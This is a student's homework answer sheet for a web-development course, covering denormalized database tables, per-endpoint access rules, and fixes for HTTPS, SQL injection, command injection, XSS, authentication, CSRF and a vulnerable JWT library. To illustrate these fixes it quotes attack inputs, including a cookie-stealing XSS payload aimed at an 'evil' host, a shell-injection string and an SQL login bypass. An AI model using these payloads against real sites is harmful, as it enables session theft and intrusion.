# Questions

Answer each question below. Replace the blank lines with your response.

## Part 1: Database Optimization

**1. In general, writes such as changing grades should only occur on the smaller normalized tables. Explain why. Since SQLite does not support materialized views, we write to both the normalized and denormalized tables instead. What problem(s) could this introduce?**

The normalized tables are the single source of truth: each fact (a grade, a student name, a course title) lives in exactly one row, so a write touches one place and cannot contradict itself. The denormalized tables are *derived* projections of that data, and the same fact may be copied across many rows (e.g. a course title is repeated for every student enrolled and every week of content). Writing there is much more expensive — one logical update can fan out to dozens of rows — and easy to get wrong.

Writing to both tables introduces the classic problems of denormalization. (a) Consistency: if the two writes ever diverge — a partial failure, a forgotten code path, a future migration — reads will silently return stale data, and the bug only surfaces when somebody notices a wrong grade on screen. We mitigate this with a transaction so both updates commit or neither does, but transactions don't help if a developer simply forgets to update one of the tables. (b) Write amplification: a single grade change now does at least two SQL statements; adding columns to other denormalized tables would multiply this further. (c) Maintenance burden: every new write path in the codebase has to know every denormalized table that mirrors the affected data, so the surface area for bugs grows with every feature.



**2. For each denormalized table you created, explain why you chose that specific set of columns. Why not include additional columns that might be useful later?**

Each table contains only what its one route needs to return, plus the column(s) it filters or sorts by.

- `student_courses(login_uid, course_id, course_code, course_title, instructor)` — `login_uid` is the WHERE key for `GET /api/students/:uid/courses`; the other four are what the dashboard renders for each card.
- `professor_courses(professor_uid, course_id, course_code, course_title, instructor)` — same shape, filtered by `professor_uid` for the professor dashboard. Built only from courses whose `professor_uid IS NOT NULL`.
- `course_content(course_id, week_id, week_title, week_sort, entry_id, entry_title, entry_type, entry_url, entry_sort)` — `course_id` is the lookup key, the rest is exactly the joined week/entry payload the course view consumes. The two `*_sort` columns are kept because the client sorts on them.
- `course_students(course_id, uid, name)` — minimal roster: the lookup key plus the two displayed fields. Email, role, etc. would just be dead weight here.
- `student_grades(login_uid, course_id, grade_id, assignment_id, assignment_name, score, sort_order)` — composite lookup key `(login_uid, course_id)`, the four fields the grades view shows, and `sort_order` so we can `ORDER BY` it.

I deliberately *didn't* add "maybe useful later" columns like passwords, course timestamps, or week descriptions. The whole point of denormalizing is trading storage for read speed, and that trade only pays off as long as the rows stay narrow: wider rows mean fewer rows per page, worse cache locality, slower index scans, and bigger write amplification (every redundant column has to be kept in sync by every write that touches the source). If a future view needs a different shape, the right answer is a new denormalized table tailored to that view, not bloating an existing one and slowing every other reader.



**3. Why not skip denormalization and just add indexes to the normalized tables?**

Indexes speed up *finding* rows, but they don't eliminate the join itself. Even with perfect indexes, a route like `GET /api/courses/:courseId/content` still has to walk `week`, look up every matching row in `entry`, and assemble the result — that's O(rows-returned) random IO across two B-trees, plus the per-row work of executing the join. Routes like grades chain *three* tables (`grade` → `assignment` → filter by `course_id`), which compounds the cost. Indexes make each individual seek fast, but they can't pre-combine the columns.

A denormalized table flattens that work *once*, at write time. The read becomes a single index seek plus a sequential range scan on a single table with the join already materialized — no join logic at query time, and the rows we want are physically grouped together so SQLite reads them off disk in a tight contiguous burst. At a few hundred rows the difference is invisible; at tens of thousands of students and courses, where each course view might be loaded thousands of times per minute, eliminating the join is the difference between a query that scales and one that doesn't. The cost is exactly the tradeoff described in question 1: more storage, careful write handling.



**4. Which users should be able to read which data? Which users should be able to write which data? For each API endpoint, describe who should have access and what kind of access they should have.**

The general rule is *least privilege*: a request should be allowed only if the authenticated user has a legitimate reason to see or change the specific data identified in the URL. The `:uid` and `:courseId` in the path are user-supplied and cannot be trusted to identify the requester — the server has to compare them against the authenticated session.

- `POST /api/login` — open to anyone (it's how you become authenticated), but it must actually verify the password.
- `GET /api/students/:uid/courses` — read access only to the student whose `uid` matches the session, plus any professor who teaches one of the courses that student is enrolled in (and admins). No other student should be able to look up someone else's schedule by guessing a UID.
- `GET /api/professors/:uid/courses` — read access to that professor; effectively low-sensitivity (which faculty teaches which course is often public), but still gated to authenticated users so it can't be scraped anonymously.
- `GET /api/courses/:courseId/content` — read access to students enrolled in that course and the professor teaching it. A student not enrolled in CS 33 should not be able to read its slides; the server must check the enrollment, not trust the client to ask only for courses it should see.
- `GET /api/courses/:courseId/students` — read access only to the professor teaching the course (and admins). This is the course roster — exposing it to other students would leak who's taking which class, which is a real privacy concern.
- `GET /api/students/:uid/courses/:courseId/grades` — read access to that student (and only for their own UID) and the professor teaching that course. No student may ever read another student's grades.
- `POST /api/grades` — write access only to the professor who teaches the course the affected grades belong to. Students must never be able to write grades, and a professor must not be able to write grades for a course they don't teach. The check needs to happen *per grade row*, not just "is the requester a professor" — being a professor is necessary but not sufficient.

In all cases, write access implies read access on the same data, and admin/staff roles (if added later) would have broader access. Crucially, the current implementation enforces none of this — every endpoint trusts the URL parameters — so these access rules are what Part 2's "Broken Access Control" section will need to actually implement.



## Part 2: Security

For each vulnerability, describe in your own words: (1) what the security hole is and what it allows an attacker to do, and (2) how you fixed it and why your fix works.

**HTTPS:**

*Hole.* The server listens with plain `app.listen` over HTTP, so every byte between the browser and the server — including the login `uid`/`password` JSON body and the auth cookie — travels in cleartext. Anyone on the same Wi-Fi (coffee shop, dorm, conference) or any compromised network hop can read or modify the traffic, including stealing credentials and session cookies.

*Fix.* I replaced `app.listen(...)` with `https.createServer({ key, cert }, app).listen(...)` and loaded a `mkcert`-generated cert/key pair for `localhost` from `./certs`. I also set `Strict-Transport-Security: max-age=15552000; includeSubDomains` so once a browser sees the site over HTTPS, it refuses to make plain-HTTP requests to it for six months. This works because TLS encrypts and integrity-protects the entire connection, and mkcert's locally-installed root CA makes the browser trust the development cert without warnings (so users aren't trained to "click through" cert errors in production).


**SQL Injection:**

*Hole.* The login route built its SQL by string interpolation: `` `SELECT ... WHERE uid = '${uid}' AND password = '${password}'` ``. Anything the user puts in those fields becomes part of the query. Submitting a `uid` of `' OR '1'='1' --` short-circuits the WHERE clause to "always true" and returns the first row in the table — instant login as that user, no password needed. The fallback `SELECT uid, name, role FROM login WHERE uid = '${uid}'` made it even worse: it would happily return a user record when the password didn't match.

*Fix.* I rewrote the query as a parameterized prepared statement: `db.prepare('SELECT uid, name, role, password FROM login WHERE uid = ?').get(uid)`. better-sqlite3 sends the SQL template and the parameter values to the database separately, so the parameter is treated as a value, never parsed as SQL — apostrophes, comment markers, etc. are just literal characters. I also removed the second "look up by uid only" fallback so a wrong password is *always* a 401.


**Command Injection:**

*Hole.* `/api/search` ran `execSync(\`grep -rl "${query}" public/\`)`, sending the user's `q` parameter directly to a shell. A query like `x"; touch /tmp/pwned; echo "` closes the quoted argument, runs an attacker-controlled command, and re-opens the quote. The attacker gets to run any shell command as the Node process — read files, exfiltrate the database, install a backdoor.

*Fix.* I switched from `execSync` to `execFileSync('grep', ['-rlF', '--', query, 'public/'])`. `execFile` skips the shell entirely and passes argv to `grep` directly, so `query` is one literal argv element no matter what characters it contains. I added `-F` (fixed-string match, so regex metacharacters in the query don't matter) and `--` (so a leading `-` in `query` can't be interpreted as a grep flag), and I cap the query length at 200 characters. The endpoint now also requires authentication.


**Cross-Site Scripting (XSS):**

*Hole.* Several places in the client interpolated server data straight into `innerHTML`: course code/instructor on the dashboard, week titles and entry links on the course page, assignment names on the grades view. If any of those strings ever contained markup — e.g. an attacker-controlled course title like `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` — the browser would parse it as HTML and execute the script in the victim's session. The `entry.url` value was also dropped straight into an `href`, which would let `javascript:alert(1)` run on click.

*Fix.* Two layers. (1) On the client, the dashboard now builds course cards with `document.createElement` and `textContent`, which inserts data as a text node so HTML is never parsed; the places that still use string-templated `innerHTML` (grades tables, lecture entries) route every server value through an `escapeHtml()` helper that turns `&<>"'` into entities; and a `safeUrl()` helper rejects any URL scheme other than relative, `http(s)`, or `#`. (2) On the server, I send a strict `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`. Even if I missed an escape somewhere, the browser refuses to load or execute scripts from anywhere but our own origin and refuses to run inline scripts, which neutralises the typical XSS payload (`<script>...</script>` or `onerror=...`). Together: the escape stops the injection from ever reaching the DOM, and the CSP stops it from running if it does.


**Broken Authentication:**

*Hole.* The server had no notion of "who is making this request." `/api/login` simply returned the user record on success and trusted the client to remember it; every subsequent request just took whatever UID was in the URL. Anyone could call `/api/students/987654321/courses` with no credentials and get Bob's data. Passwords were stored in plaintext, so a database leak immediately compromised every account (including any password those students reuse elsewhere), and the login form rendered passwords as `<input type="text">`, displaying them on screen as the user typed.

*Fix.*
- Passwords are now hashed with `bcrypt` at cost factor 12 during seed and verified with `bcrypt.compareSync` at login. bcrypt is salted and intentionally slow, so an attacker who steals the database still has to spend serious GPU time to crack each password individually rather than reversing them instantly.
- Successful login signs a JWT (`HS256`, 2-hour TTL) containing `{ uid, role, name }` and sets it as a cookie with `HttpOnly` (JavaScript can't read it, so XSS can't exfiltrate it), `Secure` (only sent over HTTPS), `SameSite=Strict` (not sent on cross-site requests at all), and a 2-hour `Max-Age`.
- Every protected route runs through a `requireAuth` middleware that reads the cookie, calls `jwt.verify` with an explicit `algorithms: ['HS256']` allowlist (this is *important* — without it, older versions accept `alg: none` and forged tokens), and rejects anything missing or invalid.
- I also added the timing-safe comparison-against-a-dummy-hash trick: even when the user doesn't exist, the server runs a full bcrypt compare so login response time doesn't leak whether a given UID is registered.
- The HTML password input is now `type="password"` so the browser masks the characters.


**Broken Access Control:**

*Hole.* Every endpoint trusted the `:uid` and `:courseId` in the URL. With authentication alone (the previous fix), Alice could log in legitimately and then call `/api/students/987654321/courses/2/grades` to read Bob's grades, or `POST /api/grades` to rewrite anyone's grades. The professor roster endpoint also leaked every student in a course to anyone who could guess the course ID. And the original login response handed back `role` and `name` to the *client*, meaning the client had to be trusted to decide what UI to show — but a client check can always be bypassed by hand-crafting requests.

*Fix.* Every protected route now checks the authenticated user against the resource being accessed, server-side, regardless of what the URL says:
- `GET /api/students/:uid/courses` — only allowed if `req.user.uid === req.params.uid`.
- `GET /api/professors/:uid/courses` — same self-check, plus role must be `professor`.
- `GET /api/courses/:courseId/content` — student must be enrolled in that course (verified against `student_courses`), or be the professor who teaches it (verified against `professor_courses`).
- `GET /api/courses/:courseId/students` — only the professor teaching that course; students get 403. This is enforced with a `requireProfessor` middleware *and* a `professorTeachesCourse(req.user.uid, courseId)` check, because being a professor is necessary but not sufficient — Prof. A shouldn't see Prof. B's roster.
- `GET /api/students/:uid/courses/:courseId/grades` — either the student themself, or the professor teaching that course.
- `POST /api/grades` — only a professor, and *for each grade row submitted* we look up its course and verify the professor teaches it. A professor can't sneak in a write for a course they don't teach by bundling it with one they do.

The shape of the rule is always: authenticated identity (from the JWT, not the URL) + relationship to the resource (from the database, not the request body). The client can request anything; the server is the gatekeeper.


**Cross-Site Request Forgery (CSRF):**

*Hole.* The server set `Access-Control-Allow-Origin: *`, `Allow-Headers: *`, and `Allow-Methods: *`. Combined with cookie-based auth (once added), this meant any third-party site could `fetch('https://localhost:3000/api/grades', { method: 'POST', credentials: 'include', ... })` and the browser would attach the victim's auth cookie. A malicious page open in another tab while a professor is logged in could silently overwrite grades; a page visited by a student could read their schedule.

*Fix.* Three layers, each sufficient on its own against most attacks; together they're solid:
1. **Cookie `SameSite=Strict`.** Modern browsers refuse to attach the cookie to *any* request originating from a different site. A cross-site `fetch` to our API simply arrives with no auth cookie and 401s.
2. **Locked-down CORS.** I removed the `*` wildcards. The middleware now sets `Access-Control-Allow-Origin: https://localhost:3000` (and `Allow-Credentials: true`) *only* when the request's `Origin` exactly matches that, and never sends `*`. Browsers reject any credentialed response that doesn't echo back the requester's origin, so a `fetch` from `evil.example` can't read the JSON either way.
3. **Explicit Origin check on state-changing requests.** A `requireSameOrigin` middleware rejects any non-GET request whose `Origin` (or `Referer`, as a fallback) doesn't start with our own origin, returning 403. This catches edge cases — older browsers, weird clients — and gives a clear server-side audit trail.


**Dependency Vulnerabilities:**

*Hole.* `npm audit` reported one high-severity advisory: `jsonwebtoken@8.5.1` is affected by three CVEs — most importantly **GHSA-qwph-4952-7xr6**, where `jwt.verify()` without an explicit `algorithms` option will accept a token signed with the `none` algorithm, so an attacker can forge a token by setting `alg: "none"` and presenting it without a signature. The other two advisories cover unrestricted key types and a public/private key confusion attack.

*Fix.* Upgraded to `jsonwebtoken@^9.0.3` (which removes the unsafe defaults), and as belt-and-suspenders I pass `{ algorithms: ['HS256'] }` explicitly to `jwt.verify` so even a regression couldn't enable `alg: none`. `npm audit` now reports zero vulnerabilities.





## Part 3: React

**5. Where does the expanded/collapsed state for each module live in your component hierarchy? Why did you put it there?**



**6. What did React make easier compared to the vanilla JavaScript implementation? What did it make harder?**



## Part 4: Responsive Design

**7. For each media query breakpoint, explain why you chose that specific cutoff value and what layout or usability problem it solves. Describe the changes you made at each breakpoint in terms of the user experience (e.g. "the sidebar collapses into a hamburger menu because there isn't enough horizontal space to show it alongside the content"), not just the CSS properties you changed.**



**8. If you used AI for this part, what did you prompt it with, and what did you have to fix or adjust by hand?**

